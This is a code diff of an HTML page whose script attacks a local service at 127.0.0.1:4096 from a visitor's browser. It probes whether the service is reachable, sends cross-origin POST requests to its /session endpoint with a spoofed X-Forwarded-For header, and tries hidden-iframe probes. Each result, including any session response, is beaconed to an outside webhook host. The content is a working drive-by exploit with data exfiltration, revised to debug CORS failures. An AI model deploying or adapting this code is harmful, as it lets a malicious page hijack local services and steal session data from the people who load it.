@@ -2,36 +2,56 @@
 <meta charset="utf-8">
 <script>
 const EXFIL = 'https://a-sd-f.free.beeceptor.com';
-function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }
+function log(s) { new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }
 
 window.onload = () => {
   log('start');
 
-  // 原用于接收 form 响应的 iframe 已无用，但保留不影响（可删除）
-  const f1 = document.createElement('iframe');
-  f1.name = 'x';
-  f1.style.display = 'none';
-  document.body.appendChild(f1);
+  // 测试目标是否可达（通过 img 的 onload/onerror）
+  const testImg = new Image();
+  testImg.onload = () => log('target-reachable-via-img');
+  testImg.onerror = () => log('target-unreachable-via-img');
+  testImg.src = 'http://127.0.0.1:4096/favicon.ico?t=' + Date.now();
 
-
-var xhr = new XMLHttpRequest();
-xhr.open('POST', 'http://127.0.0.1:4096/session');
-xhr.setRequestHeader('Content-Type', 'application/json');
+  // 方式1：XHR 带详细错误信息
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'http://127.0.0.1:4096/session');
+  xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.setRequestHeader('X-Forwarded-For', '127.0.0.1');
-xhr.onload = function() {
-    if (xhr.status === 200) {
-        // 假设服务器返回的响应体里包含 session 字段
-        var response = xhr.responseText;
-        log('session=' + encodeURIComponent(response)); // 发送到 webhook
-    } else {
-        log('error-status=' + xhr.status);
-    }
-};
-xhr.onerror = function() {
-    log('request-failed');
-};
-xhr.send('{}');
 
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+      log('xhr-readyState-4-status-' + xhr.status);
+      if (xhr.status === 0) {
+        log('xhr-status-0: CORS preflight failed or network error');
+      }
+    }
+  };
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      log('session=' + encodeURIComponent(xhr.responseText));
+    } else {
+      log('error-status=' + xhr.status);
+    }
+  };
+  xhr.onerror = function(e) {
+    log('request-failed-detail: ' + (xhr.status || 'no-status') + ' ' + (xhr.readyState));
+  };
+  try {
+    xhr.send('{}');
+  } catch(e) {
+    log('xhr-exception: ' + e.message);
+  }
+
+  // 方式2：使用 fetch + no-cors 至少发送请求（无法读响应）
+  fetch('http://127.0.0.1:4096/session', {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'application/json' },
+    body: '{}'
+  }).then(() => log('fetch-no-cors-sent')).catch(e => log('fetch-no-cors-fail: ' + e.message));
+
+  // 原有 iframe 探测
   const f2 = document.createElement('iframe');
   f2.style.display = 'none';
   f2.onload = () => log('root-onload');
